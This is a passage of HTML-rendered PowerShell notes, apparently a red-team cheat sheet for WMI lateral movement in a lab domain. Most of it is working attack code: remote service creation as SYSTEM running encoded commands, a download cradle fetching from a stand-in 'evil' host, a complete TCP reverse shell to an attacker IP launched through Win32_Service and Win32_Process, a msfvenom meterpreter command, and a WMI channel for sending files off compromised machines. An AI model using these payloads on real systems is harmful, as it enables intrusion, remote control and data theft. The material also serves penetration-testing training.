class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)}}}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Check local admin access on remote computers&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$COMPUTERS&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">ds_cn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$computer&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nv">$COMPUTERS&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">Try&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$data&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_ComputerSystem&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nv">$computer&lt;/span> &lt;span class="n">-ErrorAction&lt;/span> &lt;span class="n">Stop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="nv">$computer&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;: &amp;#34;&lt;/span> &lt;span class="n">-NoNewline&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="s2">&amp;#34;OK&amp;#34;&lt;/span> &lt;span class="n">-ForegroundColor&lt;/span> &lt;span class="n">Green&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">Catch&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="nv">$computer&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;: &amp;#34;&lt;/span> &lt;span class="n">-NoNewline&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="s2">&amp;#34;NOK&amp;#34;&lt;/span> &lt;span class="n">-ForegroundColor&lt;/span> &lt;span class="n">Red&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is not possible to perform User Hunting through WMI.&lt;/p>
&lt;h3 id="lateral-movement---wmi-as-storage-and-communication-channel">Lateral Movement - WMI as storage and communication channel&lt;/h3>
&lt;p>Using WMI as a communication channel:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Send-InfoWMI.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Send data/files from a compromised machine (needs local admin rights)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Send-InfoWMI&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Send-InfoWMI&lt;/span> &lt;span class="n">-FileToSend&lt;/span> &lt;span class="s2">&amp;#34;c:\data.txt&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Send-InfoWMI&lt;/span> &lt;span class="n">-DataToSend&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Process&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get-InfoWMI.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Receive data/files on the local machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-InfoWMI&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-InfoWMI&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-InfoWMI&lt;/span> &lt;span class="n">-OutputFile&lt;/span> &lt;span class="s2">&amp;#34;c:\data.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="lateral-movement---command-execution---win32_service">Lateral Movement - Command Execution - Win32_Service&lt;/h3>
&lt;p>It is possible to create a service on a remote machine using WMI to execute commands and scripts. This also allows persistence capabilities, but it is more noisy than simply starting a process.&lt;/p>
&lt;p>Create a service&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ServiceType&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">byte&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mf">16&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ErrorControl&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">byte&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mf">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">$False&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Windows Performance&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ErrorControl&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;WinPerf&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;c:\Windows\System32\calc.exe&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ServiceType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Manual&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;NT AUTHORITY\SYSTEM&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Argument&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>$False&lt;/td>
&lt;td>DesktopInteract&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ldquo;Windows Performance&amp;rdquo;&lt;/td>
&lt;td>DisplayName&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$ErrorControl&lt;/td>
&lt;td>User is notified&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$null&lt;/td>
&lt;td>LoadOrderGroup&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$null&lt;/td>
&lt;td>LoadOrderGroupDependencies&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ldquo;WinPerf&amp;rdquo;&lt;/td>
&lt;td>Name&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ldquo;c:\Windows\System32\calc.exe&amp;rdquo;&lt;/td>
&lt;td>PathName&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$null&lt;/td>
&lt;td>ServiceDependencies&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>$ServiceType&lt;/td>
&lt;td>OwnProcess&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ldquo;Manual&amp;rdquo;&lt;/td>
&lt;td>StartMode&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;ldquo;NT AUTHORITY\SYSTEM&amp;rdquo;&lt;/td>
&lt;td>StartName&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&amp;quot;&amp;quot;&lt;/td>
&lt;td>StartPassword&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Check if the service has been correctly created:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Start the service:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">StartService&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Remove the service:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Remove-WmiObject&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Abuse service creation on a remote box:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ServiceType&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">byte&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mf">16&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ErrorControl&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">byte&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="mf">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Encoded command&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">$False&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Windows Performance&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ErrorControl&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;WinPerf&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;c:\Windows\System32\cmd.exe /c powershell -e &amp;lt;Base64EncodedScript&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ServiceType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Manual&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;NT AUTHORITY\SYSTEM&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENTI01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">StartService&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download cradle&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">$False&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Windows Performance&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ErrorControl&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;WinPerf&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;c:\Windows\System32\cmd.exe /c powershell iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://evil.ps1&amp;#39;)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ServiceType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Manual&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;NT AUTHORITY\SYSTEM&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENTI01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">StartService&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get a reverse shell using &lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-service" target="_blank" rel="noopener">Win32_Service&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># On the local machine it is necessary to open a listener using powercat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-v&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8080&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">10000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Delete the remote service (if it exists)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.10&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Delete&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create the base64-encoded reverse shell (command to be executed with powershell -e $EncodedShell)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$port&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">8080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Shell&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s1">&amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;,&amp;#39;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$port&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s1">&amp;#39;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$EncodedShell&lt;/span> &lt;span class="p">=[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Unicode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$Shell&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># You can also use msfvenom to generate the base64-encoded reverse shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">msfvenom&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">payload&lt;/span> &lt;span class="n">windows&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">meterpreter&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">reverse_tcp&lt;/span> &lt;span class="n">LHOST&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">10.10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">2&lt;/span> &lt;span class="n">LPORT&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">8080&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">format&lt;/span> &lt;span class="n">psh&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">smallest&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">msfvenom&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">payload&lt;/span> &lt;span class="err">–&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">platform&lt;/span> &lt;span class="n">win&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="n">x86&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">encoder&lt;/span> &lt;span class="n">base64&lt;/span> &lt;span class="n">NOEXIT&lt;/span> &lt;span class="n">SYSWOW64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start the service&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">Create&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="vm">$False&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Windows Performance&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ErrorControl&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;WinPerf&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;c:\Windows\System32\cmd.exe /c powershell -e &lt;/span>&lt;span class="nv">$EncodedShell&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">$null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ServiceType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;Manual&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;NT AUTHORITY\SYSTEM&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.10&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Service&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name = &amp;#34;WinPerf&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.10&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\Administrator&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">StartService&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get a reverse shell using &lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener">Win32_Process&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># On the local machine it is necessary to open a listener using powercat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">powercat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-v&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8080&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">10000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create the base64-encoded reverse shell (command to be executed with powershell -e $EncodedShell)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ip&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.10.2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$port&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">8080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Shell&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s1">&amp;#39;$client = New-Object System.Net.Sockets.TCPClient(&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;,&amp;#39;&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="nv">$port&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s1">&amp;#39;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;$sendbyte = 